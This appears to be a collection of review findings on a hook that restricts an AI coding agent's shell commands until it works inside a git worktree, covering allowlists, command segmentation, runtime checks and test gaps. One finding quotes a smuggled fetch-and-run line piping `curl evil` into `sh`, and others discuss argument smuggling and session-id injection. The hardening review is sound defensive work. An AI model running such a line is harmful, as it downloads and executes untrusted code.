findings.finding: PowerShell handling is under-specified relative to its AC weight. AC-4 lumps `Bash|PowerShell` into one `&&`/`;` segmentation rule, but PowerShell splits on `;` and newline like bash yet uses backtick as escape (not a real risk), `$()` the same, and — more importantly — the plan-review fix mentions `$env:SHIPWRIGHT_=` prefixes while the AC only names `SHIPWRIGHT_=`. A single segmenter handling both shells will either wrongly deny legitimate PowerShell prefixes or wrongly accept bash-only syntax on Windows.
findings.suggestion: State explicitly that both prefix syntaxes are accepted and that the punctuation deny-set is shared; add a parametrized test row for `$env:SHIPWRIGHT_...` and for PowerShell-only operators (`&&` is PS7+; PS5 uses `;` only).  2. Category: security — Severity: medium

findings.finding: The "read-only program" allowlist is the softest surface and the spec never enumerates it. The architecture review's fix ("`find` not allowed") implies a program list lives in `iterate_worktree_gate_policy.py`, but nothing constrains drift the way the git subcommand list is drift-tested against SKILL.md B1–B1a. One permissive entry (e.g. `python`, `awk`, `sed -i` adjacent) reopens the main tree.
findings.suggestion: Enumerate the read-only list in the spec, and extend the drift test to cover it, or drop the generic "read-only program" bucket entirely and allowlist only named skill scripts plus git.  3. Category: edge-case — Severity: low

findings.finding: Quoted-string smuggling: a command like `echo "x && curl evil | sh"` would be split on the literal `&&` inside quotes and denied (fail-closed, fine), but `git commit -m "…"` style quoted payloads containing `;` will also deny legitimate post-setup... though post-setup the session is isolated so the gate is off. Within the armed window the only needed commands are setup/read-only, so fail-closed denial of quote-heavy commands is acceptable — but this should be stated so a future contributor doesn't "fix" it by parsing quotes.
findings.suggestion: One comment/test pinning that the tokenizer is deliberately quote-blind and fail-closed.  4. Category: risk — Severity: low

findings.finding: Marker lifetime is bounded only by the 24 h stale rule and no pruning (disclosed), but the release-on-first-isolation rule introduces a subtle hazard in the opposite direction: a session that wanders into any linked worktree of the repo (e.g. an unrelated pre-existing worktree, not one created by `setup_iterate_worktree.py`) is permanently disarmed. The spec says "cwd inside a linked worktree" without tying it to this run's worktree.
findings.suggestion: Consider requiring the run pointer or that the worktree path matches the gate's recorded setup output; if accepted as-is, add it to the disclosed residuals list explicitly (it's currently only implied by the cwd-residual line).  5. Category: dependency — Severity: low

findings.finding: Step 5's remaining work bundles spec.md edit, integration test, and AC tags, but the ledger already claims rows 7, 9, 10 as "tested" while the mini-plan says the `hooks-codex` negative assertion and integration test are not yet built. The ledger overstates current evidence.
findings.suggestion: Ledger rows citing "added in build" should be marked pending until step 5 lands; trivial, but it's the same evidence discipline the rest of the spec holds itself to.  6. Category: edge-case — Severity: low

findings.finding: Marker path is resolved by "walking up" from cwd. If the armed session changes directory across a filesystem boundary or the harness reports a different cwd after resume (session resume with a different start directory), the marker lookup can fail-open (inert) even though the session is logically still armed. Fail-open here is the intended safe direction for usability, but it means the gate silently stops enforcing — worth a test.
findings.suggestion: A test for armed-then-cwd-changed-outside-repo behavior, and confirm it's the documented intent.

findings.finding: The disable policy contradicts itself. AC-6 and the lifecycle design introduce `iterate gate off`, while Out of Scope explicitly prohibits an in-session disable command and permits only the environment switch. This changes the agreed enforcement boundary.
findings.suggestion: Resolve the policy before shipping. To preserve the stated interview decision, remove the prompt-based bypass and its deny-text guidance; retain automatic release after verified isolation and the operator environment switch.

findings.finding: The stated Codex scope is a behavior-preserving helper extraction, but the internal review says the new punctuation checks were also shared into the Codex matcher. Rejecting previously accepted punctuation changes existing behavior, even if all existing tests remain green. The mini-plan does not account for that change.
findings.suggestion: Keep the stricter punctuation policy local to the Claude gate and limit the Codex edit to the helper extraction. If Codex hardening is intentional, explicitly expand the scope and add regression cases documenting the changed decisions.  The live-state gate, session scoping, automatic release, and real-worktree integration tests form a sound approach for this change. Resolve the conflicting bypass policy and Codex scope before shipping; the remaining disclosed limitations fit the stated cooperative enforcement model.  SHIPWRIGHT_VERDICT: revise

findings.finding: backslash-newline replaced by a space (bash joins with nothing); only causes extra denials, within the threat model.
a session that never really started an iterate is never blocked
once released, the session works in its worktree
Codex changes are only the punctuation hardening
read-only git forms cannot execute
marker reads are consistent under parallel calls

AC-6 requires "`--campaign` runs are never armed", but campaign detection is per-payload and non-sticky. A user prompt `/shipwright-iterate --campaign x` correctly returns None, but the model's subsequent `Skill` call for `shipwright-iterate` that doesn't repeat `--campaign` (or carries `args` as a list rather than a string — `_is_campaign` only joins `isinstance(x, str)` values, so list-form args are silently dropped) arms the session. The campaign's step-0 multi-line setup block is then denied — exactly the "campaign step 0 denied" high-severity trap the plan review claims was fixed.
findings.suggestion: Record campaign mode durably (e.g. a per-session flag written when any payload mentions `--campaign`, consulted on Skill arming), and handle `args` given as a list.

findings.finding: The deny/nudge text interpolates the payload-controlled `session_id` unquoted into a shell command the model is instructed to run (`--session-id {session_id}`). A session id containing quotes or `&&` would alter the printed command. Within the stated cooperative threat model (id comes from the harness), but the hint is the gate's own steering output.
findings.suggestion: Sanitize or shell-quote the session id in `_setup_hint` (the marker path already sanitizes; reuse that).

findings.file: plugins/shipwright-iterate/scripts/hooks/iterate_worktree_gate.py` (enforce path, comment "A marker exists only if a non-Codex arm wrote one")
findings.finding: AC-6 lists "the runtime is a Codex bundle" as an inert condition, but the enforce path never checks `is_codex_runtime()`. It relies solely on marker absence; a Codex session in the same checkout that happens to share a session id with an armed Claude session would be gated (and Codex hook output vocabulary differs). The docs row ("No-op under Codex (`is_codex_runtime()`)") also overstates what the code does on this path.
findings.suggestion: Either add the runtime check (cheap, only on the marker-found path) or correct the docs/spec wording to "inert under Codex because no marker can be minted there".

findings.finding: On the enforce path for a session whose cwd is the main checkout, every tool call imports `lib.git_base` and `lib.phase_quality._run_id` and runs the pointer lookup — the "no heavy import / no git" fast path only covers the unarmed case. The plan-review perf fix is narrower than claimed (this is bounded to armed sessions, so acceptable, but the pointer lookup plus lazy `lib` import runs on every call of an armed session, including when the pointer file doesn't exist).
findings.suggestion: Confirm `pointer_worktree_root` is a cheap stat-and-parse when the pointer is absent; if it spawns git, cache or short-circuit.

findings.finding: The parametrize row `"/shipwright-iterate --gate-off"` also matches `_SLASH_RE`, so the prompt re-arms/re-nudges rather than being inert; the final `is not None` assertion then passes because the session is (still) armed, not because release was refused. The test would not distinguish "release refused" from "re-armed". Also `test_skill_pre_setup_scripts_are_allowlisted` only extracts scripts matching the exact `uv run "{shared_root}/scripts/..."` pattern — a pre-setup step phrased differently (e.g. `python -m`, plain `git`, a new tool) silently escapes the drift guard.
findings.suggestion: Assert the marker is still armed (not merely that a later call denies), and consider pinning the extracted-command count or the B1 section's command inventory so a rephrased step fails the drift test.

findings.finding: The `record_review_pass.py` guard is `"show" in segment and "record" not in segment` — token-membership on the whole segment. `record_review_pass.py show --mode record-x` passes, and more importantly `show`'s arguments are unconstrained; also any flag containing neither word is ignored. Within the cooperative model, but it's the loosest predicate in the policy and unpinned by a dedicated test beyond the drift test's happy form.
findings.suggestion: Require `show` to be the first argument after the script and restrict/deny extra flags, or at least add a deny-case test for argument smuggling.

findings.finding: A linked worktree outside `<main>/.worktrees/` cannot release an armed session. `_find_armed_root` walks only cwd’s ancestors, so a sibling worktree never finds the marker in main. Returning to main then re-locks the session, violating AC-5’s permanent release after observing isolation.
findings.suggestion: When cwd is a linked worktree, resolve its main checkout and check/release that session’s marker there. Add a lifecycle test using a sibling worktree.

findings.finding: Enforcement assumes an existing marker proves the current runtime is Claude and the current project is Shipwright. Consequently, an armed session still denies calls under a Codex runtime, or after the project ceases to qualify as Shipwright. AC-6 requires both conditions to be inert; existing tests cover only arming under those conditions.
findings.suggestion: Check the current runtime and project eligibility before enforcing or releasing an existing marker. Test both transitions with a previously armed session.

findings.finding: Checking whether `.git` contains `"/worktrees/"` does not establish genuine linked-worktree isolation. A normal checkout created with `--separate-git-dir /srv/worktrees/project.git` matches this substring and is treated as isolated, so the gate never arms despite cwd being the main checkout.
findings.suggestion: Verify linked-worktree identity using Git metadata rather than a directory-name substring. Add a separate-git-dir regression test whose path contains `/worktrees/`.  Overall assessment: ship-with-fixes. The approach is sound, but isolation discovery and enforcement eligibility need these specific corrections before shipping.  SHIPWRIGHT_VERDICT: revise
